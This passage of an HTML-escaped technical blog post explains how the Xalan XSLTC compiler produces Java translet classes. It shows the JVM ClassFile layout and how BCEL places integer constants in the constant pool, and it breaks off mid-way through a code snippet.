he&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;* could see his big, brown belly divided into stiff, arched segments, on&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;* top of which the bed quilt could hardly keep in position and was about&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;* to slide off completely. His numerous legs, which were pitifully thin&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;* compared to the rest of his bulk, waved helplessly before his eyes.&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;* \"What has happened to me?\", he thought. It was no dream....&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;protected&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;final&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;static&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;String&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; DEFAULT_TRANSLET_NAME &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"GregorSamsa\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://github.com/openjdk/jdk/blob/98d54e8eb2c37f44f0ffddedfddacd4876f2a027/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TransformerFactoryImpl.java#L128\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Turns out&lt;/span&gt;&lt;/a&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; that the author of this codebase was a Kafka fan.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;So what does this compilation process look like? XSLTC takes a XSLT stylesheet as input and returns a JIT'ed Java class, called translet, as output. The JVM then loads this class, constructs it and the XSLT runtime executes the transformation via a JIT'ed method.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Java class files contain the JVM bytecode for all class methods, a so-called constant pool describing all constants used and other important runtime details such as the name of its super class or access flags.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;col width=\"740\"&gt;&lt;/col&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;//&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ClassFile&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; magic&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; minor_version&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; major_version&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; constant_pool_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cp_info&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; constant_pool&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;constant_pool_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;-&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;1&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;]; // cp_info is a variable-sized object&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; access_flags&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; this_class&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; super_class&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; interfaces_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; interfaces&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;interfaces_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fields_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;field_info &amp;nbsp; &amp;nbsp; fields&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;fields_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; methods_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;method_info&amp;nbsp; &amp;nbsp; methods&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;methods_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; attributes_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;attribute_info attributes&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;attributes_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XSLTC depends on the Apache Byte Code Engineering Library (BCEL) to dynamically create Java class files. As part of the compilation process, constants in the XSLT input such as Strings or Numbers get translated into Java constants, which are then stored in the constant pool. The following code snippet shows how an XSLT integer expression gets compiled: Small integers that fit into a byte or short are stored inline in bytecode using the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;bipush&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; or &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sipush&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; instructions. Larger ones are added to the constant pool using the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;cp.addInteger&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; method:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;// org/apache/xalan/xsltc/compiler/IntExpr.java&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;public&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;void&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; translate&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ClassGenerator&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; classGen&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;,&lt;/span&gt;&lt;span 